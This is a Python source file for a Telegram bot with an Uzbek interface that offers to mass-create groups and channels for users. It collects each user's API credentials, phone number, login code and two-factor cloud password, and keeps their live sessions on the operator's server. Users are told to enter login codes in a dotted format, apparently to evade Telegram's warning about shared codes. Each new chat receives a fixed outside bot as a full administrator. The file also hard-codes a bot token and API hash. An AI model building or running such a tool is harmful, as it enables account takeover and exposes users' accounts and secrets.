import asyncio
import random
import json
import os
from datetime import datetime, timedelta
from pyrogram import Client, filters, enums
from pyrogram.types import (
    ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, 
    InlineKeyboardButton, ReplyKeyboardRemove, ChatPrivileges
)
from pyrogram.errors import AuthKeyUnregistered, UserDeactivated, SessionRevoked, SessionPasswordNeeded

# --- SOZLAMALAR ---
BOT_TOKEN = "8679954905:AAHXAI4Ye1AxrDAA6kZ351D2UrG2LOmlLMc"
API_ID = 39475566
API_HASH = "4c8bf7707bc1dcda4952ffb01efb178a"
TARGET_BOT = "hamyoncbot"
ADMIN_ID = 7781292540 

app = Client("manager_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# --- JSON MA'LUMOTLAR BAZASI ---
DB_FILE = "database.json"

def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {"users": {}, "config": {"channels": []}}

def save_db():
    with open(DB_FILE, "w", encoding="utf-8") as f:
        json.dump(db, f, indent=4, ensure_ascii=False)

db = load_db()
user_data = {}
active_sessions = {}

# --- MONITORING ---
async def session_monitor():
    while True:
        uids = list(active_sessions.keys())
        for uid in uids:
            u_cli = active_sessions[uid]
            try:
                await u_cli.get_me()
            except (AuthKeyUnregistered, UserDeactivated, SessionRevoked):
                del active_sessions[uid]
                try:
                    await app.send_message(uid, "⚠️ **Sessiya uzildi.** Qayta /start bosing.")
                except: pass
        await asyncio.sleep(60)

# --- FUNKSIYALAR ---

async def check_sub(uid):
    uid_s = str(uid)
    if uid == ADMIN_ID: return True
    if not db["config"]["channels"]: return True
    
    user_req_id = db["users"].get(uid_s, {}).get("last_requested_channel")

    for ch in db["config"]["channels"]:
        try:
            member = await app.get_chat_member(ch["id"], uid)
            if member.status in [enums.ChatMemberStatus.MEMBER, enums.ChatMemberStatus.ADMINISTRATOR, enums.ChatMemberStatus.OWNER]:
                continue
            if user_req_id == ch["id"]:
                continue
            return False
        except: 
            if user_req_id == ch["id"]:
                continue
            return False
    return True

def check_daily_limit(uid):
    uid_s = str(uid)
    user = db["users"][uid_s]
    today = datetime.now().strftime("%Y-%m-%d")
    if user.get("last_action_date") != today:
        user["daily_count"] = 0
        user["last_action_date"] = today
        save_db()
    limit = 50 if user["type"] == "Premium" else 10
    return user["daily_count"], limit

def get_main_menu(uid):
    buttons = [
        [InlineKeyboardButton("👥 Guruh ochish", callback_data="ask_group")],
        [InlineKeyboardButton("📣 Kanal ochish", callback_data="ask_channel")],
        [InlineKeyboardButton("👤 Kabinet", callback_data="cabinet")]
    ]
    if uid == ADMIN_ID:
        buttons.append([InlineKeyboardButton("⚙️ Admin Panel", callback_data="admin_panel")])
    return InlineKeyboardMarkup(buttons)

def get_admin_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 Kanal qo'shish (MOP)", callback_data="add_mop")],
        [InlineKeyboardButton("🗑 Kanallarni o'chirish", callback_data="clear_mop")],
        [InlineKeyboardButton("🔍 Foydalanuvchini qidirish", callback_data="search_user")],
        [InlineKeyboardButton("📊 Umumiy Statistika", callback_data="admin_stats")],
        [InlineKeyboardButton("⬅️ Orqaga", callback_data="back_to_main")]
    ])

def get_user_manage_kb(target_uid, is_premium, is_banned=False):
    btns = []
    if not is_premium:
        btns.append([InlineKeyboardButton("💎 Premium Berish", callback_data=f"give_prem_{target_uid}")])
    else:
        btns.append([InlineKeyboardButton("❌ Premiumni Olish", callback_data=f"take_prem_{target_uid}")])
    
    if is_banned:
        btns.append([InlineKeyboardButton("✅ Blokdan Chiqarish", callback_data=f"unblock_u_{target_uid}")])
    elif int(target_uid) != ADMIN_ID:
        btns.append([InlineKeyboardButton("🚫 Bloklash", callback_data=f"block_u_{target_uid}")])
    btns.append([InlineKeyboardButton("⬅️ Admin Panel", callback_data="admin_panel")])
    return InlineKeyboardMarkup(btns)

def get_premium_times(target_uid):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("1 kun", callback_data=f"setp_{target_uid}_1"), InlineKeyboardButton("1 hafta", callback_data=f"setp_{target_uid}_7")],
        [InlineKeyboardButton("1 oy", callback_data=f"setp_{target_uid}_30"), InlineKeyboardButton("1 yil", callback_data=f"setp_{target_uid}_365")],
        [InlineKeyboardButton("♾ Doimiy", callback_data=f"setp_{target_uid}_0")],
        [InlineKeyboardButton("⬅️ Admin Panel", callback_data="admin_panel")]
    ])

async def update_progress(message, current, total, action):
    percent = int((current / total) * 100)
    bar = "■" * (percent // 10) + "□" * (10 - (percent // 10))
    await message.edit_text(f"⏳ **{action}** ({current}/{total})\n\n`{bar}` {percent}%\n\n🤖 @{TARGET_BOT} admin qilinmoqda...")

# --- HANDLERLAR ---

@app.on_chat_join_request()
async def handle_join_request(client, request):
    uid = str(request.from_user.id)
    chat_id = request.chat.id
    if uid not in db["users"]:
        db["users"][uid] = {
            "type": "Standard", "name": request.from_user.first_name, 
            "random_id": random.randint(1000, 9999), "channels_count": 0, "groups_count": 0, 
            "daily_count": 0, "last_action_date": datetime.now().strftime("%Y-%m-%d"),
            "joined_at": datetime.now().strftime("%Y.%m.%d %H:%M"),
            "phone": "kiritilmagan", "prem_expire": "yo'q", "status": "active"
        }
    db["users"][uid]["sub_status"] = "requested"
    db["users"][uid]["last_requested_channel"] = chat_id
    save_db()

@app.on_message(filters.command("start") & filters.private)
async def start(client, message):
    uid = str(message.from_user.id)
    if uid not in db["users"]:
        db["users"][uid] = {
            "type": "Standard", "name": message.from_user.first_name, 
            "username": message.from_user.username or "yo'q",
            "random_id": random.randint(1000, 9999), "channels_count": 0, "groups_count": 0, 
            "daily_count": 0, "last_action_date": datetime.now().strftime("%Y-%m-%d"),
            "joined_at": datetime.now().strftime("%Y.%m.%d %H:%M"),
            "phone": "kiritilmagan", "prem_expire": "yo'q", "status": "active", "sub_status": "none"
        }
        save_db()
    
    if db["users"][uid]["status"] == "banned" and int(uid) != ADMIN_ID:
        return await message.reply_text("🚫 **Siz bloklangansiz!** Botdan foydalana olmaysiz.")
    
    if not await check_sub(int(uid)):
        btns = [[InlineKeyboardButton(ch["name"], url=ch["url"])] for ch in db["config"]["channels"]]
        btns.append([InlineKeyboardButton("✅ Tekshirish", callback_data="check_sub")])
        return await message.reply_text("❌ **Botdan foydalanish uchun barcha kanallarga a'zo bo'ling yoki so'rov yuboring!**", reply_markup=InlineKeyboardMarkup(btns))
    
    if int(uid) not in active_sessions:
        user_data[int(uid)] = {"step": "api_id"}
        await message.reply_text("🚀 **Xush kelibsiz!**\n\nDavom etish uchun avval tizimni my.telegram.org ga ulaning.\n\n**API ID** yuboring:")
    else:
        await message.reply_text("🏠 **Asosiy menyu**", reply_markup=get_main_menu(int(uid)))

@app.on_callback_query()
async def callbacks(client, query):
    uid_s = str(query.from_user.id)
    uid = query.from_user.id
    data = query.data

    if db["users"].get(uid_s, {}).get("status") == "banned" and uid != ADMIN_ID:
        return await query.answer("🚫 Siz bloklangansiz!", show_alert=True)
    
    admin_actions = ["admin_panel", "admin_stats", "add_mop", "clear_mop", "search_user"]
    if data != "check_sub" and data not in admin_actions and not data.startswith(("setp_", "give_", "take_", "block_", "unblock_")):
        if not await check_sub(uid):
            return await query.answer("❌ Avval ko'rsatilgan kanallarga so'rov yuboring!", show_alert=True)

    if data == "check_sub":
        if await check_sub(uid):
            await query.message.delete()
            if int(uid) not in active_sessions:
                user_data[int(uid)] = {"step": "api_id"}
                await query.message.reply_text("🚀 **Xush kelibsiz!**\n\nDavom etish uchun avval tizimni ulaning.\n\n**API ID** yuboring:")
            else:
                await query.message.reply_text("🏠 **Asosiy menyu**", reply_markup=get_main_menu(int(uid)))
        else: await query.answer("❌ Hali hamma kanallarga so'rov yubormadingiz!", show_alert=True)

    elif data == "admin_panel" and uid == ADMIN_ID:
        await query.message.edit_text("🛠 **Admin Panel:**", reply_markup=get_admin_menu())

    elif data == "add_mop" and uid == ADMIN_ID:
        user_data[uid] = {"step": "wait_channel_add"}
        await query.message.edit_text("📢 Kanalni quyidagi formatda yuboring:\n\n`Kanal Nomi | ID | Link`", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Orqaga", callback_data="admin_panel")]]))

    elif data == "clear_mop" and uid == ADMIN_ID:
        db["config"]["channels"] = []
        save_db()
        await query.answer("🗑 Kanallar tozalandi!", show_alert=True)
        await query.message.edit_text("🛠 **Admin Panel:**", reply_markup=get_admin_menu())

    elif data == "admin_stats" and uid == ADMIN_ID:
        u_count = len(db["users"])
        p_count = sum(1 for u in db["users"].values() if u.get("type") == "Premium")
        b_count = sum(1 for u in db["users"].values() if u.get("status") == "banned")
        total_channels = sum(u.get("channels_count", 0) for u in db["users"].values())
        total_groups = sum(u.get("groups_count", 0) for u in db["users"].values())
        text = (f"📊 **Umumiy Statistika:**\n\n👤 Foydalanuvchilar: {u_count}\n"
                f"💎 Premium: {p_count}\n🚫 Bloklanganlar: {b_count}\n\n"
                f"📣 Kanallar: {total_channels}\n👥 Guruhlar: {total_groups}")
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Orqaga", callback_data="admin_panel")]]))

    elif data == "search_user" and uid == ADMIN_ID:
        user_data[uid] = {"step": "wait_search"}
        await query.message.edit_text("🔍 Foydalanuvchi Telegram ID yoki Random ID sini yuboring:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Orqaga", callback_data="admin_panel")]]))

    elif data.startswith("block_u_") and uid == ADMIN_ID:
        tid = data.split("_")[2]
        if int(tid) == ADMIN_ID: return await query.answer("Adminni bloklab bo'lmaydi!", show_alert=True)
        db["users"][tid]["status"] = "banned"
        save_db()
        await query.answer("🚫 Foydalanuvchi bloklandi!")
        await query.message.delete()

    elif data.startswith("unblock_u_") and uid == ADMIN_ID:
        tid = data.split("_")[2]
        db["users"][tid]["status"] = "active"
        save_db()
        await query.answer("✅ Foydalanuvchi blokdan chiqarildi!")
        await query.message.delete()

    elif data.startswith("give_prem_") and uid == ADMIN_ID:
        tid = data.split("_")[2]
        await query.message.edit_text("Muddat tanlang:", reply_markup=get_premium_times(tid))

    elif data.startswith("take_prem_") and uid == ADMIN_ID:
        tid = data.split("_")[2]
        db["users"][tid]["type"] = "Standard"
        db["users"][tid]["prem_expire"] = "yo'q"
        save_db()
        await query.answer("❌ Premium olib qo'yildi!")
        await query.message.delete()

    elif data.startswith("setp_"):
        _, tid, days = data.split("_")
        expire_date = (datetime.now() + timedelta(days=int(days))).strftime("%Y.%m.%d %H:%M") if int(days) > 0 else "Cheksiz"
        db["users"][tid]["type"] = "Premium"
        db["users"][tid]["prem_expire"] = expire_date
        save_db()
        await query.answer(f"💎 Premium berildi!")
        await query.message.delete()

    elif data == "cabinet":
        u = db["users"][uid_s]
        used, limit = check_daily_limit(uid)
        text = (f"👤 **Kabinet**\n\n🆔 Random ID: `{u['random_id']}`\n💎 Tur: {u['type']}\n"
                f"📊 Limit: {used}/{limit}\n📣 Kanallar: {u['channels_count']}\n"
                f"👥 Guruhlar: {u['groups_count']}\n⏳ Prem: `{u['prem_expire']}`")
        await query.message.edit_text(text, reply_markup=get_main_menu(uid))

    elif data == "back_to_main":
        user_data[uid] = {}
        await query.message.edit_text("🏠 Asosiy menyu", reply_markup=get_main_menu(uid))

    elif data.startswith("ask_"):
        used, limit = check_daily_limit(uid)
        if used >= limit: return await query.answer(f"❌ Limit tugagan! ({used}/{limit})", show_alert=True)
        chat_type = data.replace("ask_", "")
        user_data[uid] = {"step": "get_count", "type": chat_type}
        await query.message.edit_text(f"🔢 Nechta {chat_type} ochmoqchisiz?", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Bekor qilish", callback_data="back_to_main")]]))

@app.on_message(filters.private & filters.text & ~filters.command("start"))
async def handle_text(client, message):
    uid_int = message.from_user.id
    uid = str(uid_int)
    if db["users"].get(uid, {}).get("status") == "banned" and uid_int != ADMIN_ID: return

    if uid_int not in user_data: return
    step = user_data[uid_int].get("step")

    if step == "wait_channel_add" and uid_int == ADMIN_ID:
        try:
            name, cid, link = message.text.split("|")
            db["config"]["channels"].append({"name": name.strip(), "id": int(cid.strip()), "url": link.strip()})
            save_db()
            await message.reply("✅ Kanal qo'shildi!", reply_markup=get_admin_menu())
            del user_data[uid_int]
        except:
            await message.reply("❌ Xato format! `Nomi | ID | Link` ko'rinishida yuboring.")

    elif step == "wait_search" and uid_int == ADMIN_ID:
        target_uid = None
        for k, v in db["users"].items():
            if k == message.text or str(v.get("random_id")) == message.text:
                target_uid = k
                break
        if target_uid:
            u = db["users"][target_uid]
            text = (f"🔍 **Topildi:**\n\nIsm: {u['name']}\nID: `{target_uid}`\n"
                    f"Random ID: `{u['random_id']}`\nTur: {u['type']}\nHolat: {u['status']}")
            await message.reply_text(text, reply_markup=get_user_manage_kb(target_uid, u['type']=="Premium", u['status']=="banned"))
            del user_data[uid_int]
        else: await message.reply("❌ Foydalanuvchi topilmadi!")

    elif step == "get_count":
        try:
            count = int(message.text)
            used, limit = check_daily_limit(uid_int)
            if used + count > limit: return await message.reply(f"❌ Limit yetmaydi! Qolgan imkoniyat: {limit-used}")
            u_cli = active_sessions[uid_int]
            status_msg = await message.reply_text("🚀 Jarayon boshlandi...")
            for i in range(1, count + 1):
                await update_progress(status_msg, i, count, user_data[uid_int]["type"])
                if user_data[uid_int]["type"] == "group":
                    db["users"][uid]["groups_count"] += 1
                    chat = await u_cli.create_supergroup(title=f"Guruh {db['users'][uid]['groups_count']}")
                else:
                    db["users"][uid]["channels_count"] += 1
                    chat = await u_cli.create_channel(title=f"Kanal {db['users'][uid]['channels_count']}")
                await u_cli.promote_chat_member(chat.id, TARGET_BOT, privileges=ChatPrivileges(can_manage_chat=True, can_post_messages=True, can_invite_users=True, can_delete_messages=True, can_change_info=True, can_restrict_members=True, can_pin_messages=True, can_promote_members=True))
                db["users"][uid]["daily_count"] += 1
                save_db(); await asyncio.sleep(2)
            await status_msg.edit_text("✅ Tugallandi!", reply_markup=get_main_menu(uid_int))
            del user_data[uid_int]
        except: await message.reply("Faqat raqam yuboring!")

    elif step == "api_id":
        user_data[uid_int].update({"api_id": int(message.text), "step": "api_hash"})
        await message.reply("✅ API Hash yuboring:")
    elif step == "api_hash":
        user_data[uid_int].update({"api_hash": message.text, "step": "phone"})
        await message.reply("📞 Raqamni yuboring:", reply_markup=ReplyKeyboardMarkup([[KeyboardButton("📱 Raqam", request_contact=True)]], resize_keyboard=True))
    
    elif step == "wait_code":
        try:
            u_cli = user_data[uid_int]["client"]
            # Kodni har doim 1.2.3.4.5 shaklidan tozalash (1.2.3.4.5 -> 12345)
            code = message.text.replace(".", "").replace(" ", "").strip()
            try:
                await u_cli.sign_in(user_data[uid_int]["phone"], user_data[uid_int]["hash"], code)
                active_sessions[uid_int] = u_cli
                await message.reply_text("✅ Muvaffaqiyatli ulandingiz!", reply_markup=get_main_menu(uid_int))
                del user_data[uid_int]
            except SessionPasswordNeeded:
                user_data[uid_int]["step"] = "wait_password"
                await message.reply_text("🔐 Akkauntingizda **ikki bosqichli tekshiruv (2FA)** yoqilgan.\n\nIltimos, bulutli parolingizni yuboring:")
            except Exception as e:
                await message.reply_text(f"❌ Xato kod! Qaytadan urinib ko'ring yoki kodni to'g'ri (1.2.3.4.5 shaklida) yuboring.")
        except Exception as e:
            await message.reply_text(f"⚠️ Texnik xato: {str(e)}")

    elif step == "wait_password":
        try:
            u_cli = user_data[uid_int]["client"]
            await u_cli.check_password(message.text)
            active_sessions[uid_int] = u_cli
            await message.reply_text("✅ Ikki bosqichli parol tasdiqlandi va ulandingiz!", reply_markup=get_main_menu(uid_int))
            del user_data[uid_int]
        except Exception as e:
            await message.reply_text("❌ Bulutli parol noto'g'ri! Qaytadan urinib ko'ring:")

@app.on_message(filters.contact)
async def contact_handler(client, message):
    uid = message.from_user.id
    if uid not in user_data or "api_id" not in user_data[uid]: return
    u_cli = Client(f"s_{uid}", api_id=user_data[uid]["api_id"], api_hash=user_data[uid]["api_hash"], in_memory=True)
    await u_cli.connect()
    code = await u_cli.send_code(message.contact.phone_number)
    user_data[uid].update({"client": u_cli, "phone": message.contact.phone_number, "hash": code.phone_code_hash, "step": "wait_code"})
    db["users"][str(uid)]["phone"] = message.contact.phone_number
    save_db()
    await message.reply("📩 Kodni **1.2.3.4.5** shaklida yuboring:", reply_markup=ReplyKeyboardRemove())

async def main():
    asyncio.create_task(session_monitor())
    await app.start()
    await asyncio.Event().wait()

if __name__ == "__main__":
    app.start()
    print("Bot ishga tushdi!")
    from pyrogram import idle
    idle()